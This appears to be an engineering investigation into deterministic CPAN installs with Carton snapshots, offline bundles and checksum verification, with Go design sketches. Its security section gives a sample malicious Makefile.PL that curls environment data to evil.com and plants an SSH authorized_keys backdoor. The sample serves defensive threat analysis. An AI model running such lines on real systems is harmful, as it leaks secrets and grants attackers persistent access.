# CPAN Ecosystem: Deterministic Execution Investigation

## Executive Summary

CPAN lacks native deterministic execution support, but Carton provides a lock mechanism (cpanfile.snapshot) that captures exact distribution versions and their dependency graph. While version locking is possible, residual non-determinism remains from XS module compilation, Perl version differences, and dynamic Makefile.PL execution. MetaCPAN API enables efficient dependency resolution at eval time, but security risks from arbitrary code execution during build configuration and lack of native checksum verification require careful mitigation.

## Lock Mechanism

### Carton and cpanfile.snapshot

CPAN itself has no lock mechanism, but **Carton** (a third-party dependency manager modeled after Bundler) provides lock file functionality through `cpanfile.snapshot`.

**Lock file format:**
```
# carton snapshot format: version 1.0
DISTRIBUTIONS
  App-Ack-3.7.0
    pathname: P/PE/PETDANCE/App-Ack-3.7.0.tar.gz
    provides:
      App::Ack 3.7.0
      App::Ack::ConfigDefault 3.7.0
      App::Ack::Filter 3.7.0
    requirements:
      File::Next 1.18
      perl 5.010001
  File-Next-1.18
    pathname: P/PE/PETDANCE/File-Next-1.18.tar.gz
    provides:
      File::Next 1.18
    requirements:
      perl 5.006001
```

**Key components:**
- **pathname**: CPAN path to exact distribution tarball (author/dist-version.tar.gz)
- **provides**: Module names and versions contained in the distribution
- **requirements**: Direct dependencies with minimum version requirements

**Lock scope:**
- Captures the complete dependency graph with exact versions
- Includes all transitive dependencies recursively
- Does NOT include checksums (unlike npm's package-lock.json or Cargo.lock)
- Does NOT lock Perl version (must be managed separately)

### cpanfile - Dependency Declaration

Dependencies are declared in `cpanfile` (similar to Gemfile or package.json):
```perl
requires 'App::Ack', '3.7.0';
requires 'Plack', '1.0000';

on 'test' => sub {
    requires 'Test::More', '0.96';
};
```

The workflow:
1. Author writes `cpanfile` with dependency constraints
2. `carton install` resolves dependencies and writes `cpanfile.snapshot`
3. Both files are committed to version control
4. On other machines, `carton install` reads snapshot for exact versions

## Eval-Time Capture

### Dependency Resolution Without Installation

**MetaCPAN API approach:**

The MetaCPAN API allows querying dependency information without downloading or installing modules:

```bash
# Get module information
curl https://fastapi.metacpan.org/v1/module/App::Ack

# Get release/distribution information with dependencies
curl https://fastapi.metacpan.org/v1/release/App-Ack
```

**Response includes:**
- `dependency` array with all dependencies
- Each dependency has: `module`, `version`, `phase` (runtime/test/configure/build)
- `download_url` for the tarball

**Recursive resolution algorithm:**
1. Query MetaCPAN API for target module
2. Extract distribution name from response
3. Query release endpoint for distribution
4. Parse `dependency` array
5. Recursively resolve each dependency
6. Build complete dependency graph

**Limitations:**
- Some dependencies are determined dynamically in Makefile.PL/Build.PL
- MetaCPAN only has static metadata from META.json/META.yml
- Dynamic dependencies (chosen at configure time) won't be captured

### Carton's Eval-Time Process

```bash
# First install: creates snapshot
carton install

# Result: cpanfile.snapshot with locked versions
```

What happens:
1. Reads cpanfile for top-level dependencies
2. Queries CPAN Meta DB or mirrors for each dependency
3. Resolves transitive dependencies recursively
4. Downloads tarballs to verify availability
5. Writes cpanfile.snapshot with complete graph

**For locked reinstall:**
```bash
# Uses existing snapshot
carton install --deployment
```

With `--deployment`:
- Only installs versions from cpanfile.snapshot
- Won't query CPAN Meta DB for new resolutions
- Fails if snapshot is incomplete or missing
- Guarantees same versions as original evaluation

### Bundle for Offline/Deterministic Deployment

```bash
# Download all tarballs locally
carton bundle

# Creates vendor/cache/ with:
# - All distribution tarballs
# - Package index (as of Carton v1.0.32+)
```

Install from bundle:
```bash
carton install --cached --deployment
```

This approach:
- Eliminates network dependency on CPAN mirrors
- Protects against removed/modified distributions
- Enables DarkPAN (internal/private modules)
- Allows using standalone cpanm instead of Carton on deploy target

## Locked Execution

### Running with Locked Dependencies

**Option 1: carton exec** (recommended)
```bash
carton exec perl myapp.pl
carton exec starman -p 8080 myapp.psgi
```

What it does:
- Sets PERL5LIB to `local/lib/perl5` (default install location)
- Ensures modules are loaded from locked installation
- Transparent to the application

**Option 2: Explicit PERL5LIB**
```bash
export PERL5LIB=/path/to/project/local/lib/perl5
perl myapp.pl
```

**Option 3: -I flag**
```bash
perl -I./local/lib/perl5 myapp.pl
```

### Environment Isolation

**Critical: Carton overwrites PERL5LIB**

From Carton source:
```perl
local $ENV{PERL5LIB} = "$path/lib/perl5";
```

This means:
- User's existing PERL5LIB is ignored
- Provides strong isolation from system Perl
- Can be problematic for mixed environments
- Ensures only locked modules are used

**PATH considerations:**
- Executables installed to `local/bin/`
- Must add to PATH or use full paths
- Carton doesn't modify PATH automatically

### cpanm Flags for Locked Execution

Direct cpanm usage (bypassing Carton):
```bash
cpanm --local-lib ./local \
      --mirror file:///path/to/vendor/cache \
      --mirror-only \
      Module::Name@1.23
```

**Key flags:**
- `--local-lib`: Install to isolated directory
- `--mirror`: Use specific CPAN mirror (can be local file://)
- `--mirror-only`: Don't query CPAN Meta DB, only use specified mirror
- `Module::Name@version`: Install specific version

**For complete isolation:**
```bash
# Clear all PERL* env vars
env -i PATH=$PATH \
  cpanm --local-lib ./local \
        --mirror file://./vendor/cache \
        --mirror-only \
        Module::Name@1.23
```

## Reproducibility Guarantees

### What CPAN/cpanm Guarantees

**With version pinning (Carton):**
- Same distribution tarballs (identified by pathname in snapshot)
- Same dependency versions
- Same module source code

**What's NOT guaranteed:**
- Build outputs (compiled XS modules)
- Perl version
- System library versions (for XS modules linking external libs)
- Module installation order (affects potential edge cases)

### XS Modules and Compilation

XS (eXternal Subroutine) modules contain C code and must be compiled during installation.

**Non-determinism sources:**
- **Compiler version**: gcc/clang version affects binary output
- **Compiler flags**: CFLAGS from environment or Perl config
- **System libraries**: XS modules linking libssl, libmysql, etc. use system versions
- **Platform differences**: Different binary format across architectures (x86_64 vs aarch64)
- **Build timestamp**: Some builds embed timestamps

**Example problematic modules:**
- DBD::mysql - links against libmysqlclient
- Crypt::OpenSSL::* - links against OpenSSL
- Compress::Raw::Zlib - links against zlib
- Any module with `.xs` or `.c` files in distribution

**Recompilation requirement:**

From CPAN.pm documentation on `recompile()`:
> The primary purpose is to finish a network installation when you have a common source tree for two different architectures.

This explicitly acknowledges that XS modules must be recompiled per architecture.

### Perl Version Sensitivity

**Core module version changes:**

Perl ships with core modules (e.g., Test::More, Data::Dumper). Different Perl versions include different core module versions.

**Problem:**
- cpanfile.snapshot created on Perl 5.30 might reference Test::More 1.302162 (from core)
- Deploying to Perl 5.28 might have Test::More 1.302136 (different core version)
- Carton may try to install newer version or fail

**Recommended solution** (from Carton docs):
- Use plenv and `.perl-version` to lock Perl version
- Ensure same Perl version in dev and production
- Treat Perl version as part of the lock

### CPAN::Meta::Spec Dependency Phases

Dependencies are categorized by phase:

| Phase | When Required | Example |
|-------|---------------|---------|
| configure | During Makefile.PL/Build.PL execution | Module::Build, ExtUtils::MakeMaker |
| build | During make/Build | ExtUtils::CBuilder |
| runtime | During normal execution | DBI, Plack |
| test | During make test/Build test | Test::More, Test::Pod |
| develop | For authors maintaining the module | Dist::Zilla, Perl::Critic |

**Accumulation rule:**
- `make` requires: configure + runtime + build
- `make test` requires: configure + runtime + build + test
- Each phase includes requirements from earlier phases

**Implication for tsuku:**
- Runtime dependencies must be in the lock
- Configure/build dependencies only needed during install, not execution
- Test dependencies can be skipped (cpanm --notest)

## Residual Non-Determinism

Even with perfect locking, these sources of variation remain:

### 1. Perl Version
- Different core module versions
- Different language features/behavior
- Different compiler optimizations
- **Mitigation**: Lock Perl version via plenv/.perl-version

### 2. XS Module Compilation
- Compiler version and flags
- System library versions
- CPU architecture
- **Mitigation**: Use pure-Perl alternatives when possible, or pre-build binaries

### 3. Dynamic Configuration (Makefile.PL)
- Makefile.PL is arbitrary Perl code executed at configure time
- Can make decisions based on system inspection:
  - Check for optional C libraries
  - Probe for system features
  - Generate different build configurations
- **Example**: DBD::mysql's Makefile.PL probes for mysql_config location
- **Cannot be locked** - execution is inherently dynamic

### 4. System Library Dependencies
- XS modules linking external libraries (OpenSSL, MySQL, etc.)
- Different library versions produce different behavior
- ABIs may be incompatible across versions
- **Mitigation**: Document required system dependencies separately

### 5. File System and Timing
- Installation order can affect outcomes in edge cases
- File modification times
- Temporary directory locations
- **Minor impact** - rarely causes real issues

### 6. CPAN Mirror State
- Without `--cached`, installs query live CPAN mirrors
- Distributions can be deleted or modified (rare but possible)
- Mirror lag/inconsistency
- **Mitigation**: Use carton bundle + --cached

### 7. Network and Certificate State
- SSL certificate verification depends on system CA bundle
- Network failures during dependency resolution
- **Mitigation**: Offline bundle deployment

## Recommended Primitive Interface

Based on the investigation, here's the recommended primitive for tsuku:

```go
// CpanInstallParams defines parameters for the cpan_install primitive.
// This primitive represents the decomposition barrier for CPAN ecosystem installations.
type CpanInstallParams struct {
    // Distribution is the CPAN distribution name (e.g., "App-Ack")
    Distribution string `json:"distribution"`

    // Module is the optional module name (e.g., "App::Ack")
    // Used when distribution name doesn't match standard naming convention
    Module string `json:"module,omitempty"`

    // Version is the exact version to install (required for determinism)
    Version string `json:"version"`

    // Executables are the binary names to install and verify
    Executables []string `json:"executables"`

    // Snapshot contains the complete cpanfile.snapshot content
    // This locks all transitive dependencies with exact versions and CPAN paths
    Snapshot string `json:"snapshot"`

    // PerlVersion specifies the required Perl version (e.g., "5.38.0")
    // Critical for core module compatibility
    PerlVersion string `json:"perl_version"`

    // Mirror specifies the CPAN mirror or local bundle to use
    // Format: https://cpan.metacpan.org/ or file:///path/to/vendor/cache
    Mirror string `json:"mirror,omitempty"`

    // MirrorOnly when true, prevents fallback to CPAN Meta DB
    // Ensures installation only uses the specified mirror (critical for reproducibility)
    MirrorOnly bool `json:"mirror_only"`

    // CachedBundle when true, uses pre-downloaded tarballs from vendor/cache
    // Eliminates network dependency and ensures exact tarballs
    CachedBundle bool `json:"cached_bundle,omitempty"`

    // NoTest skips test suite execution (faster, less strict)
    NoTest bool `json:"no_test"`

    // InstallBase is the installation directory (maps to --local-lib)
    // Will be set by executor to tool's install directory
    InstallBase string `json:"install_base"`
}

// Locks contains the lock information captured at eval time
type CpanInstallLocks struct {
    // Snapshot is the cpanfile.snapshot content
    Snapshot string `json:"snapshot"`

    // PerlVersion is the Perl version used for evaluation
    PerlVersion string `json:"perl_version"`

    // BundleSHA256 is the checksum of the vendor/cache bundle if used
    BundleSHA256 string `json:"bundle_sha256,omitempty"`

    // DistributionChecksums maps distribution paths to SHA256 checksums
    // Extracted from CPAN CHECKSUMS files when available
    // Note: CPAN doesn't guarantee checksum availability for all distributions
    DistributionChecksums map[string]string `json:"distribution_checksums,omitempty"`
}

// Example plan step:
// {
//   "action": "cpan_install",
//   "params": {
//     "distribution": "App-Ack",
//     "module": "App::Ack",
//     "version": "3.7.0",
//     "executables": ["ack"],
//     "snapshot": "# carton snapshot format: version 1.0\nDISTRIBUTIONS\n...",
//     "perl_version": "5.38.0",
//     "mirror": "file:///home/user/.tsuku/tools/ack-3.7.0/vendor/cache",
//     "mirror_only": true,
//     "cached_bundle": true,
//     "no_test": true,
//     "install_base": "/home/user/.tsuku/tools/ack-3.7.0"
//   },
//   "locks": {
//     "snapshot": "# carton snapshot format: version 1.0\nDISTRIBUTIONS\n...",
//     "perl_version": "5.38.0",
//     "bundle_sha256": "abc123...",
//     "distribution_checksums": {
//       "P/PE/PETDANCE/App-Ack-3.7.0.tar.gz": "def456...",
//       "P/PE/PETDANCE/File-Next-1.18.tar.gz": "789abc..."
//     }
//   },
//   "deterministic": false
// }
```

### Interface Design Rationale

**Why include full snapshot in params:**
- Snapshot contains complete dependency graph with exact versions
- Eliminates need for dependency resolution during execution
- Self-contained - execution doesn't need access to original cpanfile

**Why separate Mirror and CachedBundle:**
- Mirror can point to public CPAN or local bundle
- CachedBundle flag indicates pre-downloaded tarballs exist
- Allows flexibility: online-with-lock vs offline-with-bundle

**Why PerlVersion is critical:**
- Core module versions vary between Perl versions
- XS compilation depends on Perl's compiled configuration
- Makes non-determinism explicit and controllable

**Why DistributionChecksums is optional:**
- CPAN CHECKSUMS files exist but aren't universally guaranteed
- Better to capture when available than fail when absent
- Provides defense-in-depth against tampered mirrors

**Why NoTest:**
- Tests can fail due to environment differences
- Tests aren't needed for execution (only development/verification)
- Matches current tsuku cpan_install behavior

## Security Considerations

### 1. Arbitrary Code Execution in Makefile.PL/Build.PL

**The problem:**

CPAN installation requires executing `Makefile.PL` or `Build.PL` before building. These are arbitrary Perl scripts that run with the user's privileges.

**Attack vector:**
```perl
# Malicious Makefile.PL
use ExtUtils::MakeMaker;

# Exfiltrate environment
system("curl http://evil.com/?data=$(env | base64)");

# Install backdoor
system("cp /tmp/backdoor ~/.ssh/authorized_keys");

# Normal-looking Makefile generation
WriteMakefile(
    NAME => 'Innocent::Module',
    VERSION_FROM => 'lib/Innocent/Module.pm',
);
```

**Mitigations:**
- **Sandboxing**: Run cpanm in container/VM with restricted network and filesystem
- **Vetted mirrors**: Use organization-controlled CPAN mirror with reviewed modules
- **Code review**: Review Makefile.PL before installation (manual, time-consuming)
- **Minimal privilege**: Run installations as low-privilege user
- **Network isolation**: Block internet during installation (requires local mirror)

**Current tsuku approach:**
- No sandboxing (runs with user privileges)
- Trusts CPAN ecosystem (same as standard Perl workflow)
- Validates distribution/module names to prevent injection

**Recommendation for deterministic execution:**
- Eval phase runs Makefile.PL to resolve dependencies (can't avoid)
- Exec phase with locked snapshot still runs Makefile.PL (build requirement)
- Consider: Pre-built binary packages for critical XS modules (avoid build entirely)

### 2. CPAN Mirror Tampering

**The problem:**

CPAN mirrors could serve modified distributions:
- Man-in-the-middle attacks
- Compromised mirror servers
- DNS hijacking to malicious mirrors

**CPAN's built-in protections:**
- CHECKSUMS files on mirrors (contain SHA256 hashes)
- CHECKSUMS files are GPG-signed by PAUSE
- Signature verification available via Module::Signature

**Limitations:**
- cpanm doesn't verify CHECKSUMS by default
- Module::Signature verification is opt-in
- HTTPS not required (many mirrors use HTTP)
- Trust in PAUSE signing key

**Mitigations:**
- Use HTTPS mirrors when possible
- Verify CHECKSUMS files (not standard in cpanm workflow)
- Use --mirror-only with trusted local mirror
- Bundle distributions with carton bundle (eliminates mirror dependency)
- Capture distribution checksums at eval time, verify at exec time

**Recommendation for tsuku:**
```go
// During eval (decomposition):
1. Query MetaCPAN for distribution metadata
2. Download distribution tarball
3. Compute SHA256 checksum
4. Store in DistributionChecksums map
5. Bundle tarball in vendor/cache

// During exec:
1. Use --mirror file://vendor/cache with --mirror-only
2. Verify downloaded tarball matches DistributionChecksums
3. Fail hard on mismatch (security feature)
```

### 3. XS Module Linking Vulnerabilities

**The problem:**

XS modules link against system libraries. Vulnerabilities in those libraries affect the module.

**Example:**
- DBD::mysql links libmysqlclient
- libmysqlclient has a vulnerability
- Perl module inherits the vulnerability even if module code is safe

**Mitigations:**
- Keep system libraries updated
- Prefer pure-Perl modules when performance allows
- Document XS dependencies in recipe metadata
- Consider vendoring/statically linking libraries (complex)

**Recommendation for tsuku:**
- Add "xs_dependencies" metadata to recipes
- Document required system packages
- Warn users about XS modules in install output

### 4. Dependency Confusion Attacks

**The problem:**

An attacker uploads a module with the same name as an internal module to public CPAN.

**Attack:**
```
Organization uses internal::util v1.0 (from DarkPAN)
Attacker uploads internal::util v2.0 to CPAN
cpanm finds v2.0 on CPAN and installs malicious code
```

**Mitigations:**
- Use --mirror-only with internal mirror (blocks public CPAN)
- Namespace internal modules distinctly (e.g., MyCompany::*)
- Use carton with --deployment (only installs from snapshot)

**Relevance to tsuku:**
- Low risk (tsuku installs public tools, not internal dependencies)
- If supporting DarkPAN in future, recommend --mirror-only

### 5. Typosquatting

**The problem:**

Attacker uploads module with similar name to popular module:
- `App::Akc` instead of `App::Ack` (typo)
- `DBI::mysql` instead of `DBD::mysql` (confusion)

**Mitigations:**
- Verify module names carefully in recipes
- Pin exact versions in cpanfile
- Review cpanfile.snapshot for unexpected modules

**Tsuku protection:**
- Recipes are curated (typos caught during review)
- Version pinning prevents surprise updates
- Snapshot verification ensures expected modules

### 6. Compromised Author Account

**The problem:**

Attacker compromises a CPAN author's PAUSE account and uploads malicious version.

**CPAN protections:**
- PAUSE requires authentication for uploads
- Each upload is logged
- Community monitoring of suspicious changes

**Mitigations:**
- Pin versions (don't auto-upgrade)
- Review changes when upgrading
- Monitor security advisories (CPAN::Audit)

**Recommendation:**
- Use CPAN::Audit to check for known vulnerabilities
- Document known-good versions in recipes

## Efficient Eval-Time Resolution

### MetaCPAN API Strategy

**Goal:** Resolve complete dependency graph without installing anything.

**Approach:**
1. Query MetaCPAN API for target module
2. Extract distribution and dependencies
3. Recursively resolve dependencies
4. Build cpanfile.snapshot structure
5. Download tarballs to vendor/cache
6. Compute checksums

**Implementation sketch:**

```go
type MetaCPANResolver struct {
    client *http.Client
    cache  map[string]*Release // Memoization
}

type Release struct {
    Distribution string
    Version      string
    Author       string
    Pathname     string // e.g., "P/PE/PETDANCE/App-Ack-3.7.0.tar.gz"
    Dependencies []Dependency
    DownloadURL  string
}

type Dependency struct {
    Module  string
    Version string
    Phase   string // runtime, test, configure, build
}

func (r *MetaCPANResolver) Resolve(module string, version string) (*DependencyGraph, error) {
    // 1. Fetch module metadata
    url := fmt.Sprintf("https://fastapi.metacpan.org/v1/module/%s", module)
    moduleInfo := r.fetchJSON(url)

    distName := moduleInfo["distribution"]

    // 2. Fetch release/distribution metadata
    releaseURL := fmt.Sprintf("https://fastapi.metacpan.org/v1/release/%s", distName)
    release := r.fetchJSON(releaseURL)

    // 3. Recursively resolve dependencies
    graph := &DependencyGraph{}
    for _, dep := range release["dependency"] {
        if dep["phase"] == "runtime" || dep["phase"] == "configure" {
            // Recursive call
            subGraph := r.Resolve(dep["module"], dep["version"])
            graph.Merge(subGraph)
        }
    }

    // 4. Download tarball and compute checksum
    tarballURL := release["download_url"]
    checksum := r.downloadAndHash(tarballURL)

    graph.Add(Release{
        Distribution: distName,
        Pathname:     release["pathname"],
        Dependencies: release["dependency"],
        Checksum:     checksum,
    })

    return graph, nil
}

func (r *MetaCPANResolver) GenerateSnapshot(graph *DependencyGraph) string {
    // Convert DependencyGraph to cpanfile.snapshot format
    var buf bytes.Buffer
    buf.WriteString("# carton snapshot format: version 1.0\n")
    buf.WriteString("DISTRIBUTIONS\n")

    for _, dist := range graph.Distributions {
        buf.WriteString(fmt.Sprintf("  %s-%s\n", dist.Distribution, dist.Version))
        buf.WriteString(fmt.Sprintf("    pathname: %s\n", dist.Pathname))
        buf.WriteString("    provides:\n")
        for module, version := range dist.Provides {
            buf.WriteString(fmt.Sprintf("      %s %s\n", module, version))
        }
        buf.WriteString("    requirements:\n")
        for _, dep := range dist.Dependencies {
            buf.WriteString(fmt.Sprintf("      %s %s\n", dep.Module, dep.Version))
        }
    }

    return buf.String()
}
```

**Optimizations:**

1. **Caching**: Memoize MetaCPAN responses (same module requested multiple times)
2. **Parallel fetching**: Resolve independent branches concurrently
3. **Phase filtering**: Only resolve runtime + configure dependencies (skip test/develop)
4. **Early termination**: If we've already resolved a module@version, skip

**Limitations:**

1. **Dynamic dependencies**: Makefile.PL can add dependencies not in metadata
2. **Conditional dependencies**: Some deps only needed on certain platforms
3. **API rate limits**: MetaCPAN may rate-limit aggressive querying
4. **Stale metadata**: MetaCPAN index may lag recent uploads

**Hybrid approach (recommended):**

```
1. Use MetaCPAN API for initial quick resolution
2. Validate by running: carton install --deployment (with generated snapshot)
3. If validation finds missing deps, update snapshot
4. Iterate until converged
```

This ensures:
- Fast common case (API resolution works)
- Correctness (Carton validates against real Makefile.PL)
- Best of both worlds

### Alternative: Use Carton Directly

**Simpler approach:**

```bash
# Write minimal cpanfile
echo "requires 'App::Ack', '3.7.0';" > cpanfile

# Let Carton do the resolution
carton install

# Carton creates cpanfile.snapshot

# Bundle for offline use
carton bundle
```

**Pros:**
- Leverages existing, well-tested tool
- Handles dynamic dependencies correctly
- No need to implement MetaCPAN API client

**Cons:**
- Requires Carton installed on eval system
- Slower (actually downloads and installs modules)
- Creates temporary installation artifacts

**Recommendation for tsuku:**

Use Carton during eval phase:
1. Generate temporary cpanfile from recipe
2. Run `carton install` in temp directory
3. Capture resulting cpanfile.snapshot
4. Run `carton bundle` to create vendor/cache
5. Store snapshot + bundle in installation plan
6. Clean up temporary directory

This is simpler and more correct than reimplementing dependency resolution.

## Implementation Recommendations

### 1. Decomposition Strategy

**In `CpanInstallAction.Decompose()`:**

```go
func (a *CpanInstallAction) Decompose(ctx *EvalContext, params map[string]interface{}) ([]Step, error) {
    distribution := params["distribution"].(string)
    version := ctx.Version
    module := params["module"].(string) // optional

    // Create temporary directory
    tmpDir := filepath.Join(os.TempDir(), "tsuku-cpan-eval-" + uuid.New().String())
    defer os.RemoveAll(tmpDir)

    // Generate cpanfile
    cpanfilePath := filepath.Join(tmpDir, "cpanfile")
    targetModule := module
    if targetModule == "" {
        targetModule = distributionToModule(distribution)
    }
    cpanfileContent := fmt.Sprintf("requires '%s', '%s';\n", targetModule, version)
    os.WriteFile(cpanfilePath, []byte(cpanfileContent), 0644)

    // Run carton install to resolve dependencies
    cmd := exec.Command("carton", "install")
    cmd.Dir = tmpDir
    cmd.Env = cleanPerlEnv() // Clear PERL* vars
    if err := cmd.Run(); err != nil {
        return nil, fmt.Errorf("carton install failed: %w", err)
    }

    // Read cpanfile.snapshot
    snapshotPath := filepath.Join(tmpDir, "cpanfile.snapshot")
    snapshot, err := os.ReadFile(snapshotPath)
    if err != nil {
        return nil, fmt.Errorf("failed to read snapshot: %w", err)
    }

    // Bundle dependencies
    cmd = exec.Command("carton", "bundle")
    cmd.Dir = tmpDir
    if err := cmd.Run(); err != nil {
        return nil, fmt.Errorf("carton bundle failed: %w", err)
    }

    // Compute bundle checksum
    bundleDir := filepath.Join(tmpDir, "vendor", "cache")
    bundleChecksum := computeDirectoryChecksum(bundleDir)

    // Extract distribution checksums from CHECKSUMS files
    distChecksums := extractDistributionChecksums(bundleDir)

    // Get Perl version
    perlVersion := detectPerlVersion()

    // Return primitive step
    return []Step{
        {
            Action: "cpan_install",
            Params: map[string]interface{}{
                "distribution":   distribution,
                "module":         module,
                "version":        version,
                "executables":    params["executables"],
                "snapshot":       string(snapshot),
                "perl_version":   perlVersion,
                "mirror":         "file://$INSTALL_DIR/vendor/cache",
                "mirror_only":    true,
                "cached_bundle":  true,
                "no_test":        true,
            },
            Locks: map[string]interface{}{
                "snapshot":       string(snapshot),
                "perl_version":   perlVersion,
                "bundle_sha256":  bundleChecksum,
                "distribution_checksums": distChecksums,
            },
            // Copy vendor/cache to plan storage
            Artifacts: map[string]string{
                "vendor_cache": bundleDir,
            },
        },
    }, nil
}
```

### 2. Execution Strategy

**In `CpanInstallAction.Execute()` (execution with plan):**

```go
func (a *CpanInstallAction) Execute(ctx *ExecutionContext, params map[string]interface{}) error {
    // Extract params from plan
    distribution := params["distribution"].(string)
    version := params["version"].(string)
    snapshot := params["snapshot"].(string)
    mirrorURL := params["mirror"].(string)
    executables := params["executables"].([]string)

    // Verify Perl version matches
    currentPerlVersion := detectPerlVersion()
    expectedPerlVersion := params["perl_version"].(string)
    if currentPerlVersion != expectedPerlVersion {
        return fmt.Errorf("Perl version mismatch: plan expects %s, current is %s",
            expectedPerlVersion, currentPerlVersion)
    }

    // Write snapshot to install dir
    snapshotPath := filepath.Join(ctx.InstallDir, "cpanfile.snapshot")
    os.WriteFile(snapshotPath, []byte(snapshot), 0644)

    // Extract vendor/cache bundle to install dir (from plan artifacts)
    vendorCacheDest := filepath.Join(ctx.InstallDir, "vendor", "cache")
    os.MkdirAll(vendorCacheDest, 0755)
    extractArtifact(ctx.Plan, "vendor_cache", vendorCacheDest)

    // Verify bundle checksum
    expectedBundleChecksum := params["bundle_sha256"].(string)
    actualBundleChecksum := computeDirectoryChecksum(vendorCacheDest)
    if actualBundleChecksum != expectedBundleChecksum {
        return fmt.Errorf("bundle checksum mismatch: expected %s, got %s",
            expectedBundleChecksum, actualBundleChecksum)
    }

    // Expand mirror path (replace $INSTALL_DIR)
    actualMirror := strings.ReplaceAll(mirrorURL, "$INSTALL_DIR", ctx.InstallDir)

    // Run cpanm with locked settings
    localLib := filepath.Join(ctx.InstallDir, "local")
    cmd := exec.Command("cpanm",
        "--local-lib", localLib,
        "--mirror", actualMirror,
        "--mirror-only",
        "--notest",
        fmt.Sprintf("%s@%s", distributionToModule(distribution), version),
    )

    // Clear PERL* environment
    cmd.Env = cleanPerlEnv()

    // Run installation
    if err := cmd.Run(); err != nil {
        return fmt.Errorf("cpanm install failed: %w", err)
    }

    // Verify executables exist
    for _, exe := range executables {
        exePath := filepath.Join(localLib, "bin", exe)
        if _, err := os.Stat(exePath); err != nil {
            return fmt.Errorf("expected executable %s not found", exe)
        }
    }

    // Create wrappers (existing logic)
    // ...

    return nil
}
```

### 3. Prerequisites

**System requirements:**
- Perl (ideally locked version via plenv)
- cpanm (App::cpanminus)
- Carton (for eval phase)

**Tsuku recipe dependencies:**
- perl recipe should install: perl + cpanm + carton
- cpan_install recipes should depend on perl recipe

### 4. Plan Storage

**Plan structure:**
```json
{
  "steps": [
    {
      "action": "cpan_install",
      "params": { ... },
      "locks": { ... },
      "artifacts": {
        "vendor_cache": "path/to/bundled/cache"
      }
    }
  ]
}
```

**Artifact storage:**
- vendor/cache is bundled with the plan
- Could be: embedded tarball, separate directory, content-addressed store
- On execution, extracted to tool's install directory

### 5. Error Handling

**Eval-time errors:**
- Carton install failure: dependency not found, network error
- Bundle failure: disk space, permissions
- Should fail fast with clear message

**Exec-time errors:**
- Perl version mismatch: hard failure (core module incompatibility risk)
- Bundle checksum mismatch: hard failure (security feature)
- cpanm failure: retry logic? or hard failure?
- Missing executables: hard failure (installation incomplete)

### 6. Testing Strategy

**Unit tests:**
- CpanInstallAction.Decompose() with mock Carton
- Snapshot parsing
- Checksum computation

**Integration tests:**
- Full eval → exec cycle for simple module (e.g., App::Ack)
- Full eval → exec cycle for module with XS dependencies
- Verify same outputs across multiple exec runs
- Perl version mismatch handling

**Reproducibility validation:**
```bash
# Eval once
tsuku eval ack > plan.json

# Exec multiple times in different environments
tsuku install --plan plan.json  # machine 1
tsuku install --plan plan.json  # machine 2

# Verify:
diff machine1/.tsuku/tools/ack-3.7.0/local/lib/perl5 \
     machine2/.tsuku/tools/ack-3.7.0/local/lib/perl5

# Should be identical (except XS compiled modules)
```

### 7. Documentation

**For recipe authors:**
- How to specify cpan_install in recipes
- When to use module vs distribution param
- How to find executable names

**For users:**
- Reproducibility guarantees and limitations
- Perl version locking recommendations
- XS module caveats

**Security:**
- Document Makefile.PL execution risk
- Recommend sandboxing for untrusted modules
- Explain checksum verification

## Summary

CPAN deterministic execution is achievable through Carton's lock mechanism, but requires:

1. **Full dependency graph lock** via cpanfile.snapshot
2. **Offline bundle** via carton bundle (eliminates mirror dependency)
3. **Perl version lock** (critical for core module compatibility)
4. **Checksum verification** (defense against tampering)

**Residual non-determinism:**
- XS module compilation (compiler, system libs, architecture)
- Dynamic Makefile.PL decisions
- Platform-specific conditional dependencies

**Security is a major concern:**
- Makefile.PL arbitrary code execution
- CPAN mirror tampering
- XS linking vulnerabilities

**Recommended approach:**
- Use Carton for eval-time resolution (correct and simple)
- Bundle vendor/cache with plan
- Use cpanm --mirror-only for exec-time installation
- Verify checksums and Perl version
- Mark cpan_install as non-deterministic (deterministic: false)

This provides best-effort reproducibility within CPAN ecosystem constraints.
